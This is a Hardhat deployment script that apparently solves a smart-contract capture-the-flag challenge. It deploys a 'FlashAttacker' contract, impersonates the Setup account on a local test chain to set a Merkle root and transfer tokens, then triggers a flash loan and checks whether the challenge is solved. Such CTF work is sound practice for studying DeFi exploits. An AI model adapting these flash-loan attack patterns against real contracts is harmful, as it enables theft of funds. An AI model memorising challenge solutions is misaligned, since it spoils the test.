const hre = require('hardhat');
const { ethers } = hre;
const fs = require('fs');
const path = require('path');

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log('Using deployer', deployer.address);

  const dj = path.join(process.cwd(), 'deployed.json');
  if (!fs.existsSync(dj)) throw new Error('deployed.json not found; run deploy first');
  const data = JSON.parse(fs.readFileSync(dj, 'utf8'));

  const setupAddr = data.setup;
  const butlerAddr = data.gentleman;
  const t1Addr = data.token1;
  const t2Addr = data.token2;
  const t3Addr = data.token3;
  const flashAddr = data.flashProvider;

  const FlashAttacker = await ethers.getContractFactory('FlashAttacker');
  const attacker = await FlashAttacker.deploy(butlerAddr, flashAddr, t1Addr, t2Addr, t3Addr);
  await attacker.waitForDeployment?.();
  const attackerAddr = await attacker.getAddress();
  console.log('Attacker deployed at', attackerAddr);

  // Note: Token3 initial supply is owned by the Setup contract. We'll impersonate
  // Setup later to transfer Token3 to the attacker. No pre-fund from deployer.

  // proof is empty because deploy uses zero merkle root
  const proof = [];
  const amount = ethers.parseUnits('1000', 0);
  const provider = ethers.provider;

  // Impersonate Setup so we can set the merkle root and transfer token3 to attacker
  await provider.send('hardhat_impersonateAccount', [setupAddr]);
  // Fund the impersonated account so it can pay gas
  await provider.send('hardhat_setBalance', [setupAddr, '0xDE0B6B3A7640000']);
  const setupSigner = await ethers.getSigner(setupAddr);

  // Set merkle root so attacker (leaf) is allowed without a proof
  const flash = await ethers.getContractAt('MerkleFlashLoan', flashAddr);
  // Compute keccak256 of the raw 20-byte address (abi.encodePacked(address))
  // const root = ethers.keccak256(attackerAddr);
  const root = ethers.keccak256(ethers.getBytes(attackerAddr));

  console.log('Setting merkle root to attacker leaf:', root);
  const txRoot = await flash.connect(setupSigner).setRoot(root);
  await txRoot.wait();

  // Transfer some Token3 from Setup to attacker so the hook will be triggered
  const t3 = await ethers.getContractAt('Token', t3Addr);
  const txT3 = await t3.connect(setupSigner).transfer(attackerAddr, 1000);
  await txT3.wait();
  console.log('Setup funded attacker with token3');

  // Stop impersonation
  await provider.send('hardhat_stopImpersonatingAccount', [setupAddr]);

  console.log('Requesting flash loan...');
  const tx = await attacker.requestLoan(amount, proof);
  await tx.wait();

  // Check solved
  const Setup = await ethers.getContractFactory('Setup');
  const setup = Setup.attach(setupAddr);
  const solved = await setup.isSolved();
  console.log('isSolved =', solved);
}

main().catch((e) => { console.error(e); process.exit(1); });
